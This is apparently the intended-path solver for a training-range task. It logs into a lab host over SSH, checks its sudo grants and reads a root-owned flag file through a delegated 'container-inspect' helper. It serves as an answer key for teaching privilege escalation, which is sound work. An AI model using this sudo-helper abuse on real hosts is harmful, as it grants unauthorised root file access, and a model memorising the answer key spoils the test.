"""Intended-path solver: read the simulated host flag via the delegated inspector."""

import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

CHECK_SOCKET = "ls -l /var/run/docker.sock 2>&1 || true"
LIST_GRANTS = "sudo -n -l 2>&1 || true"
LS_HOSTSIM = "sudo -n /usr/local/bin/container-inspect ls /hostsim/root"
CAT_FLAG = "sudo -n /usr/local/bin/container-inspect cat /hostsim/root/flag.txt"


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    try:
        _, stdout, _ = client.exec_command(LIST_GRANTS, timeout=15)
        grants = stdout.read().decode(errors="replace")
        if "container-inspect" not in grants:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="inspect-hostsim",
                        ok=False,
                        captured=None,
                        detail=f"no container-inspect grant visible: {grants[:200]}",
                    )
                ]
            )

        _, stdout, _ = client.exec_command(CHECK_SOCKET, timeout=15)
        socket_out = stdout.read().decode(errors="replace")
        if "No such file" not in socket_out and "cannot access" not in socket_out:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="inspect-hostsim",
                        ok=False,
                        captured=None,
                        detail=f"unexpected docker socket present: {socket_out[:200]}",
                    )
                ]
            )

        _, stdout, _ = client.exec_command(LS_HOSTSIM, timeout=20)
        listing = stdout.read().decode(errors="replace")
        if "flag.txt" not in listing:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="inspect-hostsim",
                        ok=False,
                        captured=None,
                        detail=f"/hostsim/root missing flag.txt: {listing[:200]}",
                    )
                ]
            )

        _, stdout, stderr = client.exec_command(CAT_FLAG, timeout=20)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
        flags = find_flags(out)
        captured = flags[0] if flags else None
    finally:
        client.close()

    return SolveResult(
        results=[
            TaskResult(
                task_id="inspect-hostsim",
                ok=bool(captured),
                captured=captured,
                detail=None
                if captured
                else f"inspector produced no flag (err={err[:200]}, out={out[:200]})",
            )
        ]
    )
